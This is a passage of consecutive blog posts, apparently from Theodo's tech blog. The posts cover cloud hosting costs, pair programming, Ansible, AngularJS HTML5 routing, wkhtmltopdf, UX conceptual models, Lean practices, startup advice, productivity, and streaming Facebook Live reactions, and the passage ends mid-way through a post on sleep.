Customization and services
+
++
–


Ease of use
+
+
++



On Heroku,

You need to configure manually the scale of your infrastructure
You have less integrations than on AWS
But it is more user friendly than AWS EC2
You have less new concepts to understand than Serverless

On the other hand, once you get used to Serverless or EC2s, you can implement your service faster and more easily.
Pricing
I’ll consider two scenarios:

The custom IFFT: low traffic and light computing memory
A data processing job running every hour

Requiring less than 500MB RAM
Requiring more than 500MB RAM






Serverless
EC2
Heroku




1
0.30€/month
3€/month
Free for 1 app


2.1
0.67€/month
4€/month
7€/month


2.2
1.35€/month
8€/month
25€/month




Heroku is still a good plan in case 1
AWS is a better bargain if:
You need a cron job every hour
You need lots of computing memory
Serverless is cheaper than EC2

That’s it for now!
I’ll be happy to have your opinion or feedback if you tried using Serverless or AWS Lambda, or if you have any question or suggestion about this tutorial.
Feel free to leave a comment 
Sources for the benchmark

AWS Lambda Pricing in Context – A Comparison to EC2
AWS Lambda Pricing Calculator and AWS Simple Monthly Calculator
Heroku Pricing Page


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Yu Ling Cheng
  			
  				Lead Developer at Theodo
https://www.linkedin.com/in/yulingcheng  			
  		
    
			

									"
"
										 
What is pair programming?
Pair programming is when two developers work on the same task on a single machine in a specific way: in pair programming (or “pairing”), the two devs must swap between two roles:

one at the keyboard, physically writing the code
the other not at the keyboard, suggesting ideas and catching errors

The roles must be swapped on a timer, for example 5 minutes or 3 minutes, which you can set with a phone alarm or an application on the computer.
There are many situations in a sprint when pair programming is really useful.
Read on to find out how and when you can use it!
Advantages
Errors can be caught faster when you have two people looking at the code.
Two coders working together in this way will come up with ideas and potential solutions much faster.
It’s like instant code review.
The experience of the two developers is combined meaning better architectural decisions are taken.
The alternating timeboxes mean that a developer can’t get stuck with a problem for long periods with no new ideas.
No-one loses focus on the work, and both developers keep contributing.
Disadvantages
Since pair programming requires full focus, the two devs should ensure they take regular breaks.
So when should you use it?
Conceptually complex tasks
Pair programming can really improve your performance on conceptually complex tickets, because these are the ones where the number of details is so large that a single developer would be significantly slowed down and have a higher probability of making mistakes.
Having another developer on hand reduces these problems.
For example, when integrating a new payment provider with a backend server and a frontend app, the number of details is immense and could be ameliorated by pairing.
Speeding up important tasks (e.g. the sprint goal)
In order to prioritise the sprint goal, when the sprint backlog is empty but there are still sprint-goal-related tickets in doing, developers should pair on the sprint goal tickets rather than taking tickets from the product backlog.
This brings the full development power of two devs to bear on the most critical work in the sprint.
The exception to this is if a single dev is particularly well-placed to do the tickets and would be slowed down by pairing – in that case, that dev should tackle the sprint goal.
Training
Pair programming is extremely useful for onboarding new developers – whether new to Theodo or new to a team.
A more experienced developer can pair with a trainee to quickly and effectively share knowledge of the project and general coding skills.
Pairing helps the trainee stay engaged and ensures they write code themselves, instead of leaving the work to the experienced developer.
When pairing for training, it is particularly important to respect the timer.
A good balance is for the trainee to pair in the morning and tackle tickets on their own in the afternoon.
Help
When a developer needs help with a specific issue, they can ask another developer – for example their coach, the architect on the project or any developer who knows about the issue, or indeed any developer – to pair with them.
Knowledge can then be shared fluently.
Even pairing with a developer with no specific experience in the project can be useful as they may catch errors you have missed, or bring fresh ideas.
Bottlenecks
When there are more developers available than tickets available (e.g. in the case of dependency chains, or blocked tickets), pairing can allow the full power of multiple developers to be focused on the available tickets.
Knowledge-sharing
Pairing is great for the express purpose of sharing knowledge of a new feature – a developer working the sole ticket implementing new functionality can ask another developer to pair so that the second developer also learns the additional information that is being introduced to the project.
This is important to maintain a cross-functional team, which is necessary for a scrum dev team.
Interviewing
Pair programming is a revealing way to gain an insight into candidates interviewing for the role of developer.
When you pair with someone, you can assess their knowledge firsthand, see how they react to new knowledge, and experience their style of communication and coding.
Conclusion
Pair programming is a great solution whenever you need to do a complex ticket, speed up an important ticket, train a new dev, help or be helped by another dev on a technical issue, get past a dependency bottleneck in a sprint, share knowledge in the dev team, or conduct a technical interview.
Since these situations arise in every project, and potentially in every sprint (e.g. the sprint goal will always be an important task worth prioritising), you should pair whenever possible in these situations.
Pairing helps everyone in the team get to know each other, builds team spirit, and makes working together on the same task more engaging!
It would be great to hear from you – post any interesting experiences or use-cases of pair programming in the comments below!
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Farhan Mannan
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										[Edit]: I’m writting a book about Ansible, click here if want a free draft.
When you start a new project and you create the Ansible provisioning for it, you will do those tasks:

Find the right role on Ansible Galaxy and check if there is nothing odd inside.
Write the role you need to have a final working provisioning
Write the configuration files (group_vars, hosts, var files)
Configure your Vagrantfile
Test and debug everything until it works fine

All of this requires time and Ansible’s knowledge to perform. So I wrote a very opinionated and simple yeoman like tool to automate it. My choices are:

The tool works only on Mac and Linux
It is designed to provision only Ubuntu’s servers
It targets only the last Ubuntu LTS (currently xenial)

With very one command line, you get what you want:

What is there inside ?

A Vagrantfile to launch and configure your local VM
An Ansible playbook to provision the local VM and the prod. It includes:

Nginx
PHP
Composer
A database role (Mysql, Postgresql or Mongodb)
An Ansible playbook which is easy to evolve to satisfy your project specifications
The Capifony configuration to deploy the code



The steps are pretty straightforward and explained on the documentation.
If you have any question, feel free to ping me on Twitter and/or create an issue on Github. All feedbacks are very welcome =).
If you want to know more about how to build great Ansible playbook, this article may give you some ideas.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										AngularJS routing system is great to create RESTful single-page applications, but it comes at the cost of accepting the # fragment in all your urls. There are several reasons you would like to drop this tiny character:

Search Engine Optimization (SEO) considerations
Use Anchors in your pages and urls

Good news, you can easily configure your application to go from:
myapp.com/#/my/angular/routes
To:
myapp.com/my/angular/routes
There are two things that need to be done:

Configuring AngularJS to enable HTML5 mode
Configuring your backend framework to redirect all non-REST and non-static-asset HTTP requests to the frontend index.html

Configuring your backend is necessary to tell your server to redirect the “/my/angular/routes” to the angular app, and avoid getting 404 errors. Here I will be using Loopback as an example of REST API framework, but it can be easily adapted to other frameworks like Spring or Symfony.
Step 1: Configuring AngularJS to enable HTML5 mode
This step will depend on which version of Angular you’re using.
Angular 1 with angular-route or angular-ui-router
When you set your angular application configuration, you simply have to use the $locationProvider module and set html5Mode to true.
angular.module('app')
  .config(config)

config.$inject = ['$locationProvider'];
function config($locationProvider) {
  $locationProvider.html5Mode(true);
}

To tell Angular what is the base path of your application, provide a base tag to your index.html

<!doctype html>
<html>
  <head>
    <meta charset=""utf-8"">
    <base href=""/"">
  </head>

Angular 2
The equivalent of HTML5 mode in Angular 2 is to use the PathLocationStrategy as the router strategy.

import {ROUTER_PROVIDERS, APP_BASE_HREF} from 'angular2/router';

bootstrap(yourApp, [
  ROUTER_PROVIDERS, // includes binding to PathLocationStrategy
  provide(APP_BASE_HREF, {useValue: '/'})
]);

You can edit the APP_BASE_HREF to define your application base path
provide(APP_BASE_HREF, {useValue: '/my/app/path'})
Step 2: Configuring your backend
The above configuration will work on its own until you try to access an angular route directly with its url, because your web server won’t know he has to redirect this url to your angular application.
To fix that, you must configure your backend framework to redirect all your angular route urls to the index.html.
To do this, add a filter to the server.js file.
var path = require('path');

//List here the paths you do not want to be redirected to the angular application (scripts, stylesheets, templates, loopback REST API, ...)
var ignoredPaths = ['/vendor', '/css', '/js', '/views', '/api'];

app.all('/*', function(req, res, next) {
  //Redirecting to index only the requests that do not start with ignored paths
  if(!startsWith(req.url, ignoredPaths))
    res.sendFile('index.html', { root: path.resolve(__dirname, '..', 'client') });
  else
    next();
});

function startsWith(string, array) {
  for(i = 0; i < array.length; i++)
    if(string.startsWith(array[i]))
      return true;
  return false;
}

Now, all your requests that do not match the specified patterns will be taken care of by the angular routing system and not the Loopback one.
The only disadvantage is that you have to be careful when adding new assets or REST endpoints and be sure that their urls do not conflict with angular routes.
Conclusion
Congratulations! You have a fully functional angular application without any trace of # in urls!
What’s next? You could dive deeper into Angular state management features and implement basic route authorization in AngularJS.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Georges Biaux
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										In the previous article, we saw how to use wkhtmltopdf. But, when I did it, I encountered problems that I really want to share with you.
Each problem has a solution
First, you have to understand what wkhtmltopdf does: rendering the html with ‘its own browser‘. So, when something does not seem to work, try:

To add an option to wkhtmltopdf’s browser configuration
Modify the html you gave to wkhtmltopdf’s browser

Now, we can improve the rendering of our pdf!
How to handle the dimensions of the pdf

First, we need to define these two new functions:
// controller.js

// Return the width and the height of the document
// In the way the user see it
getSize = function(html) {
  return {
    width: html.offsetWidth,
    height: html.offsetHeight,
  }
}

// Return the real full height of the document
// With no scroll
getRealHeight = function(html) {
  clone = angular.copy(html)
  clone.style.height = 'auto'
  realHeight = clone.offsetHeight

  return realHeight
}

And give these two new values to our back-end
// controller.js

$scope.print = function() {
  var html = document.getElementsByTagName('html')[0];
  var body = {
    html: html,
    size: getSize(html),
    realHeight: getRealHeight(html),
  };

  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'})
  .success(function(response) {
    var file = new Blob([ response ], {type: 'application/pdf'});
    FileSaver.saveAs(file, 'print.pdf');
  })
}

In the back-end you just have to set the following options

viewport-size is used to emulate the window size
page-width and page-height are used to set the pdf size

// pdf.js
  var size = req.body.size
  var realHeight = req.body.realHeight

  var options = {
    'viewport-size': size.width + 'x' + size.height,
    // I found a 0.271 ratio
    'page-width': (size.width * 0.271),
    'page-height': (realHeight * 0.271),
    'user-style-sheet': CSSLocation,
  }

This way you have exactly what you see on your navigator!
Nota Bene: the page-width and page-height values were given in mm, so I thought I should have a 0.264583333 ratio from pixel to mm. But when I tried, I found 0.271 as a better approximation. (This was useful on my project because of SVG with inline dimensions)

 How to display the images correctly
You need to know one thing: wkhtmltopdf needs absolute paths for images. In my project, I used this fix:
// pdf.js

// Replace relativ path of img by absolute path
html = html.replace(/static\/images\//g, projectLocation + 'client/www/static/images/')

But you have to change the regex /static\/images\//g and the path client/www/static/images/ according to where the images are stored.
How to modify the pdf before printing it
If you understand how wkhtmltopdf works, this hint won’t surprise you: modify the html you send!
// controller.js
  var body = {
    html: getModifiedHtml(html),
    size: getSize(html),
    realHeight: getRealHeight(html),
  };

Now you can do what you want with your pdf:
// controller.js
getModifiedHtml = function(html) {
  newHtml = angular.copy(html)
  newHtml = removeHeader(newHtml)
  newHtml = removeFooter(newHtml)
  newHtml = addNewHeader(newHtml)
  newHtml = addNewFooter(newHtml)
  newHtml = doStuff(newHtml)
  // ...
  return newHtml
}

But the first line newHtml = angular.copy(html) is really important.
Do not forget to start by copying the html you got before modifying it.
Otherwise, your user will be surprised…


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Vincent Langlet
  			
  				Vincent Langlet is an agile web developer at Theodo.  			
  		
    
			

									"
"
										Modelling is a widely used tool in Computer Science, but often only thought about from a programming, architecture or requirements gathering perspective. There is a large amount of Human Computer Interaction (HCI) research that shows the importance of modelling the underlying conceptual model of your system from the user’s perspective, ensuring you build a system that exposes to the user a task oriented and intuitive set of concepts the purpose and relationships between which are clear.
Read on to discover what a conceptual model is, how it is communicated into the mind of the user, the problems that occur when there is a mismatch with the users internalised mental model and the challenges of iterating a conceptual model once in production.
What is a conceptual model?
A conceptual model defines all the interface concepts users need to understand to use a system. It specifies the concepts, their relationships (e.g. one containing another) and operations that can be executed on them. The conceptual model of a system can be designed before the technology stack, data model or dev team are ready. Designing it involves understanding the task domain and building up a set of concepts that can be used to achieve the desired tasks.
A good way to express the mental model in a design artifact is to use a basic entity relationship (ER) diagram that maps out the key concepts. A rough sketch of the conceptual model underlying a simple email service helps to illustrate the idea (see below). Lines show the associations and labelled arrows the actions.

Well established in the fields of HCI and UX, but less understood by computer scientists and programmers, the conceptual model should form the focus of any user centered design approach. A good conceptual model is be obvious, intuitive and task oriented. Furthermore it should form the basis of design decisions regarding user interaction. 
Use case analysis is another way to express the underlying conceptual model, but it is easier to iterate a simple ER diagram and also simpler to refer to it when making design decisions.
Internalisation as a Mental Model

A mental model is the same idea, but from the perspective of the user. A conceptual model is designed by the system designer whereas a mental model is subconsciously internalized by the user through interaction with the platform. The key to a usable system with good UX is to design a system that transfers an accurate representation of the underlying conceptual model into the user’s mind. This can be achieved by using a simple and understandable conceptual model, and using this model in the design of the user interface. 

Your conceptual model does not need to be technology based, in fact this will likely be an unintuitive conceptual model. Base it on intuitive and task oriented concepts that are familiar to the user.

 
When the two mismatch

It is important that the mental model internalised by the user matches the conceptual model underlying the system as this mental model is used by the user to make assumptions, simulate actions in their head and form task plans to achieve goals with using the system.
The classic example of a mismatch between a user’s mental model and the conceptual model of a system is in the operation of a simple home thermostat. The thermostat seems intuitive, turn clockwise for hotter and anti-clockwise for colder. The issue occurs when users come home to a cold house and want it hotter quickly. Many people will turn the thermostat to a higher temperature than desired, thinking that it will heat up quicker. This in fact turns out to be a flawed assumption, resulting from a poor mental model. The user has internalised a mental model similar to that of a cooking hob, where the heat source has an adjustable (on a continuous scale) output, but the heating element of a home central heating system is in fact at a binary system (on or off, 2 discrete values). 

In the above example the consequences are minor, but false assumptions on a banking, e-commerce or messaging platform can have more severe consequences. Even if consequences are mild, a system that does not seem to fulfil a user’s desire will likely be perceived as broken, unintuitive or overly complex.
Potential challenges in an Agile world
Any user centered design framework has iterative as one of its core principles. If the conceptual model is the key embodiment of the a system’s design, from a user interaction point of view, then it’s obvious it needs to be iterated.
Early stage iteration is great; grab some sharpies and go crazy. Even better is to validate this early draft with target users, and going even further to this create lo-fi wireframes, conduct usability testing with real target users and analyse the results for possible issues with the underlying conceptual model.
Too many projects view this conceptual modeling as the ‘ux designer’s’ responsibility, or lack any conscious thought to is at all. Large scale projects can have a great conceptual model developed by an external design firm, but once we start changing the design we need to iterate and keep in mind the conceptual model. 

 
Good UX is the responsibility of programmers as well as UX consultants.

 
In an iterative world we need to be careful about big sweeping changes to our conceptual model after we have real users in production. Of course we can’t stop improving it, but we need to be careful not to make big changes to the conceptual model without just cause. Users have already internalised their mental model, and they will use it to interact with the system. As soon as we change the system’s conceptual model their mental model becomes out of date. You should try to help existing users in this transition period, making extra effort to make the changes and operation of new concepts clear. 
Takeaways


Start by designing the conceptual model, ‘begin by designing what to design’.
Aim to make the conceptual model ‘obvious, task oriented and simple’
Use concepts familiar to the target users, and define the target user before this stage. 
Document your conceptual model (UML is your friend, but keep it dynamic and up to date!)
Base your design UI/UX decisions on this conceptual model (hence keeping it up to date should be automatic as you use the model while making design decisions).
Iterate this conceptual model based on real user feedback and testing, BUT be careful on the impact on your existing user base.



Everyone is responsible for good UX, and in today’s world it can make or break a company!

 
 
 
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ben Ellerby
  			
  				  			
  		
    
			

									"
"
										
 How a Spanish Coffee Chain started to go Lean


This article wants to be a friendly and concrete introduction to Lean. If you have only heard of the concept, I hope you get a clearer view of what Lean is. If you’re an expert, I hope it provides you with additional facts for you to spread the word about this incredible philosophy. In any case, I left out the most theoretical aspects of Lean to provide a pragmatic case, so there’s plenty more to be learned! And now, lets hop to our tale, shall we?






Pain and reaction
Emi and Juan Antonio Tena, wife and husband, founded 365 in 1999. 365 is a Coffee Chain set in Barcelona. The founders were born in service. In their childhood they waited tables, served coffee, and helped in the kitchen. 365 had 3 cafés opened in 2003, 9 in 2005, and in 2009, there were 33 of them. Contrary to what their growth suggests, things didn’t go smoothly. The staff was angry. The quality was poor. They were disorganized. As a result, customer satisfaction was low. 365 is a mix between a café and a bakery: they sell sandwiches and pastries that you can eat in the shop. Baguettes and pastries are produced in a single bakery, and are then transported to the shops. Since they were still growing in 2009, the founders planned on buying a whole new building to increase their production and storage space. At this point, by chance, Juan Antonio came across the book Lean thinking.
The book theorizes Lean manufacturing, which is one of the many efforts of extending what Toyota had been doing successfully since the 1950s. Keep in mind that Toyota’s challenge was to manufacture cars fast in a post-war Japan, where resources were rare and expensive. Yet, Japan became a huge economic power in thirty years, and Toyota became one of the main car manufacturers. Lean, at its core, aims at producing goods one by one, as fast as possible, and with no waste. Imagine the perfect Lean system as a production line where your product is being built without defects by karate masters. Lean is hard to explain because reducing waste is achieved through desperately simple steps. Bear in mind that Lean is hard because it involves change, it involves breaking the “it’s always been done that way” state of mind, and it involved breaking it several times every single day. So how did Emi and Juan Antonio onboard their employees, whose preoccupations were doing their day-to-day work? They started by telling their bakers to go home two hours earlier for three weeks.






Lowering the surface of the sea to see the rocks
First, let me reassure you: the bakers were still getting their full wage, even though they were working less. The fridges got empty in three weeks, as the bakers were producing less than what was needed for each day. And that was precisely the goal of this risky maneuver. See, those storage spaces were very costly, and they wasted time. Picture yourself picking frozen baguettes in a very large fridge, trying to find the freshest ones at the back, which you can barely see. You could argue that it’s a matter of organization, yet the bigger the storage, the harder it is to actually visualize what’s in it, and the more you get constrained by how your facility is designed. At first, the bakers thought the founders had gone crazy. Little by little, the fridges’ contents decreased and they eventually got rid of the freezer. The expensive building they considered buying? They did not need it any more. The quality of the bread? Without freezing, it increased dramatically.
This is not a fairy tale though. Emi and Juan Antonio did not snap their fingers, made the fridges disappear, and suddenly everyone got happy. Here’s why. A baguette gets significantly less fresh after one day. We have a single bakery, without much storage space for the baguettes. You then have to bring them more often to the shops which means you get more heavily impacted by problems in the production process. And this is where it gets interesting! Remember the situation : you are an unhappy worker who has to produce a lot. Suddenly, your stressed boss Juan Antonio tells you that you have to go home earlier every day until the fridges to became empty. When they did, every problem, like a broken oven or overcooked baguettes, could no longer be solved thanks to your stock, and so they hurt more than before. Wouldn’t you have asked for the old system to be brought back? This is where the founders had to be smart.
Lean is a just-in-time manufacturing process, meaning that ideally you would produce baguettes, or cars, one by one. Just-in-time is also a hallmark of Fordism, a system that has been rightfully criticized for the big strain it put on workers. Lean, and Toyota, use just-in-time to show the problems in the manufacturing process, and give the workers the ability to stop the production chain if they spot a problem, and give them tools to solve them. You can see it as lowering the surface of the sea to see the rocks. Emi and Juan Antonio hired Lean coaches to help the bakers solve the day-to-day production issues, they encouraged the employees to take Lean classes, and went to Lean workshops. In other words, if your production chain was a water hose, using just-in-time would be adding pressure to the water travelling inside it to find the holes.






Embracing the problems
It’s impossible to go into the details of the countless specific problems 365 employees solve every day, so I’ll relate one. Leonor « Leo » Tena, daughter of the founders, who also works at 365, kindly told me about it during a video call. Strangely, she kept excusing herself for her Spanish accent when I had no trouble understanding her at all, and I thought my accent was far worse. « In the factory they have different sections. One of them takes the bread from the fermentadora and puts it in the oven. At this step the size was a frequent problem » she explains. As a result, the baguettes coming out of the oven tiny and dry. Why? This was because the fermentation was going wrong. Why? Because the bread had to have a specific size to be put in the fermentation room aka the fermentadora. Eventually one of the bakers got fed up with the defect. « At first the baker used a cardboard that he cut as a guide to check the size of the baguette. The manager said it’s a good idea and they made a metal one. Now it’s even used for other things as the bread », Leo told me.
It does not seem like much, but remember that they solve these kinds of problems every day. If they did not have Lean, they would have maybe went on with the problem, because since they had stock a few baguettes gone wrong did not have a big impact. The manager could also have spotted the problem and engineered a complicated solution. Because the baker was working close to the problem, he was able to find a simple and pragmatic solution. His manager helped him in making it a standardized one. This type of solution is called an andon in Lean, and here it takes the form of a simple quality check.
Eventually, after months of efforts, people felt like Lean really worked. « They were doing les movement, producing the double. The saw the results; it’s easy to see the results: they used less hours to produce the same things. In the end, you agree with the methods », summed up Leo.
Lean is now applied everywhere in 365, from the providers, to the workshop, the shops, accounting, or human resources. This article has been fueled by a presentation and a visit of 365 during the Barcelona Lean Summit, which I attended with my fellow Theodoers. There is a lot more to write about 365 and Lean, so do feel free to express your interest in another article like this one!
To go further:

this article from Planet Lean is an interesting analysis of 365
a summary of Lean Thinking
an article on minimizing inventory
“it’s always been done that way” and the Five Monkeys fable

This article has been cross-posted to my Medium page.




										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Flavian Hautbois
  			
  				Developer at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  			
  		
    
			

									"
"
										


Startups need to experiment and safely fail, and fail a lot
Three years ago, I embarked on a startup adventure along with three friends of mine. We had everything: a revolutionary idea, feel-good buzzwords (“Cloud! Big Data! Internet of Things!”), and more than two hundred thousand euros of public and private investments.
Of course, this is ironic, and we failed miserably because we had no clients.
We are the main reasons of our failure. We refused to measure our problems and I completely over-engineered our product. Now, I think you could have helped us detect we were aiming at failure. Your experience means much to startuppers and you could improve on the following points.
Five-year business plans harm a much needed flexibility
We have dealt with the French PIB (Public Investment Bank) as well as with PBA (Paris Business Angels), whose name is self-explanatory.
Both asked us for a five-year business plan.
Asking to foresee the future with a business plan is a waste of time. Do you know why? Because startups are not bakery stores.
They deal with enormous uncertainty, so their goal is to iterate fast and fail often. How do you fail fast when you provide a five-year business plan?
Why should we spend countless hours constructing such a BP even though we KNOW it will be obsolete in two months? Sure, it can and should be updated, but why don’t we use a less time-consuming format?
Worse yet: when we make a BP, we impede our capacity to pivot, since we refuse to recognize signs of failure: “Hey, smart people validated my plan, so I’m fine, right?”.
In The Lean Startup, Eric Ries advocates to look at learning accountability. Successful innovative start ups went through many MVPs (Minimum Viable Products) to get where they are. You can measure them through the Lean Canvas. “Product” in MVP has a large sense. It is the minimal amount of work needed to validate business knowledge.
We’re innovators, not accountants, at least at the beginning. Before investing, you should ask us “how do you plan to learn more about your clients?” not ask us to predict the future. You should then help us hire good accountants, not turn us into some.
In my former startup, we have wasted months executing our plan without ever validating it with customers. We have over-engineered our systems betting on a massive growth that never came (where are you, my 20,000 users?).
Focus on our ability to learn with simple experiments. Focus on our capacity to transmit efficiently this learning to you. Focus on the founders team’s mindset.
When when the startup succeeds, it will be the right time to ask for long-term accountability through a Business Plan.



Read the rest on Medium by clicking this link !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Flavian Hautbois
  			
  				Developer at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  			
  		
    
			

									"
"
										
I find the joy of the ‘doing’ increases. Creativity increases. Intuition increases. The pleasure of life grows. And negativity recedes. David Lynch
Hello there! Are you a creative person? Yes? No? Actually, the question is misleading, because creativity is not a personality trait, it’s a skill. It is something you can train. Sure, some people are born more creative than others. Some have a better aesthetic sense. But that’s just a baseline level. Do you think that creativity is limited to artistic endeavors? You’d be dead wrong and I’ll bet you that you use your creative skills every day, far from all the glamour you may have in mind. Whether at school or at work, or even during your vacations, you must have had this moment when an idea kicks in, and you find an efficient way to optimize a repetitive task so that you do it faster or get rid of it; or maybe you devised an elegant plan to visit the three monuments you absolutely wanted to see in one day. Getting more creative can help you in your everyday personal “projects” as well as in your work life. And I’ll tell you what: just like a muscle, the more you use your creativity, the more you can develop it.
Why should you train your creative muscle? Well, creative thinking will be one key skill of the 21st Century (find more here, or here). As for any training, you’ll benefit a lot from following a program. The program I’ll detail here is not a definitive answer and is surely incomplete, but it has worked for me so far and I invite you to try it. My personal experience involves creating music, building a (failed) startup whose name was TraxAir, and working for Theodo. Also, I recently started writing articles (hey there!).
This program hinges around training your creativity by doing. The act of doing is what will drive progress in your life. You will be put in front of real problems that you have to solve quickly. Solving problems obviously requires creativity, so doing it more will make you flex your creative muscle. I certainly hope you will be able to apply it to whatever your favorite domains are (is it research? Business? Cinema? Writing? Painting?Music? Pet stuffing?). Before reading further, think about a project of interest to you and imagine yourself going through the workout.
This creativity workout is called STRESS, and it should enable you to do more withless stress. STRESS stands for 6 steps:

Small is the way to start
To-do lists make you work faster
Reproduce parts of work you like
Evaluation is the fuel for greatness
Share your work
Start over and repeat

Read the rest on Medium


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Flavian Hautbois
  			
  				Developer at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  			
  		
    
			

									"
"
										Or, how I got started with todo lists after failing again and again
Where is your whale in your life? Do you feel overwhelmed in your personal life or at work? This is it. Sometimes your whale gets lighter; this is when you go on holidays, this is on Friday night before a good week-end. But most of the time you curse at your work or you are angry at your colleague Billy for interrupting you all day long. But there is a way out, and I can lead the way. My goal was to form a new habit of throwing my whale into a todo list. It seems crazy that writing things down makes you more efficient than keeping everything in your mind, but it works. I was introduced to this concept by the most productive writer on productivity that I know of, Brian Tracy, in his books Eat That Frog, Getting Things Done, and in this short video. Yet I kept struggling with actually applying those concepts to my daily life. In this article, I want to describe my first successful step into setting a habit of pouring my whale in writings so that you can get inspired in doing the same, because writing down all my “Oh I should do this” all the time has been transformative for me.
Read the rest of the story on Medium.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Flavian Hautbois
  			
  				Developer at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  			
  		
    
			

									"
"
										Facebook released its new feature: the Live Video.
You’re surely aware that America elected a new president and you may remember the buzz of that night: the live from ABC News asking who will win, by making people vote through the Facebook reactions.
Like the live for Trump, love it for Hillary.
The video had more than a hundred thousands reactions and millions of views.
I want it too!
So some friends and I wanted to try it for our FB page.
There are multiple services online that offer to do it for you.
I’m going to show you how to do it for free 😀
How does it work?
Basically you need:

A Facebook page
OBS
A web page you want to stream
The process

The development of the webpage you want to stream is what takes the longest.
However, very little knowledge is needed to get this working.
How to stream?
For a Facebook live, you need to stream a video right?
We’ll use OBS, a simple tool to stream anything from your webcam, an image, a sound, a local HTML page or a website.
Do you see where this is going?
What to stream?
Well… We’ll stream an HTML page displaying whatever you like but above all: the interactions your viewers had with the video, like reactions (like, love, etc) or comments!
The HTML page
I’m not going to enter into HTML CSS JS details (I’ve done it with JQuery), just the main tips.
If you want to look at some code, here ya go!
Don’t judge!
First you need to get the reactions inside a refreshCounts function:

function refreshCounts() {
  var url = 'https://graph.facebook.com/v2.8/?ids=' + postID + '&fields=' + reactions + '&access_token=' + access_token;
  $.getJSON(url, function(res){
    //do stuff with the result
  }
}


We use the facebook Graph API.
As you see it needs:

a postID
an access token
reactions

For the reactions:

var reactions = ['LIKE', 'LOVE', 'WOW', 'HAHA', 'SAD', 'ANGRY'].map(function (e) {
    var code = 'reactions_' + e.toLowerCase();
    return 'reactions.type(' + e + ').limit(0).summary(total_count).as(' + code + ')'
}).join(',');


You can try the Graph API with one of your post, I let you check on the Internet how to get the ID of a post. for a live its simple, just click on the video and the post id is the last part of url.
For example: https://www.facebook.com/newtrackfr/videos/1240079556075061.
For the access token you can get it on the explorer page.
Now you have something like this:

var postID = 1240079556075061
var access_token = a3very5long36token
function refreshCounts() {
  // stuff
}


Great, you can work with the reactions of a post.
I suggest to work with a random Facebook live, to see if the reactions, the comments, or whatever you want to get from the post is updated on your webpage.
But it’s not very interactive yet… Because it’s not live.
Get Live!
Now let’s walk through the steps to get a live video:

on your FB page create a live post
get the Stream key of your FB live, save it somewhere
open OBS, add a source, like the background of the page you want to stream
in OBS preferences -> Stream -> Stream Key : paste your stream key
stream with OBS
back on Facebook click on next, and when the stream is ok launch the live
get the postID of your live and put it in your webpage
in OBS, stream the html page (or the website)
phase 3: profit



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sammy Teillet
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										At Theodo we always try to find a better way of doing things. We are strong advocates of the lean mindset but we know we still have a lot to learn! So Today, all the Theodo Academy companies (Theodo, Theodo UK, BAM and Sicara) are at the Barcelona Lean summit. We are listening to lean gurus experiences, visiting a lean bakery, attending pratical sessions and… having fun ;-)!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Girault
  			
  				Nicolas is a web developer eager to create value for trustworthy businesses.
Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
			

									"
"
										A simple experiment to improve your sleep without gadgets
Let’s get something straight. Not sleeping enough or well enough is bad for you and for others. It makes you fat, makes you angry, makes you sick. In his book Sleep Thieves, the neuropsychologist Stanley Coren provides evidence that missing two hours of sleep each day for a week can make you lose thirty IQ points (which turns a highly intelligent person to someone who scores below average). Finally, know that sleep deprivation has been one of the root causes in the Challenger or Chernobyl disasters.
The basics
How much time do you need to sleep? Basically, science says: 8 hours a day assuming you’re an adult, since the actual time depends on your age. Your sleep alternates between:

a long non-REM (also called “not the famous rock band”) sleep phase that has four stages. You only need to know that the higher the stage, the deeper the sleep, and the deeper the sleep, the more motionless you are and the more difficult it is for you to wake up.
a short REM sleep phase, where your eyes move from left to right and your brain’s activity skyrockets. Note that both REM and non-REM sleep phases are important to your sleep, your memory, and that they both trigger dreams.
sometimes, a brief awakening. You are usually not conscious during this phase, except if you badly want to pee.

You can see how this works on the hypnogram below.

This hypnogram, however, is slightly misleading. You are led to believe that in general, all sleep cycles have the same average duration, and it is not the case. The first cycle is slightly shorter, lasting 70–100 minutes, while the other ones last 90–120 minutes (source).
To win the sleeping game, you must:

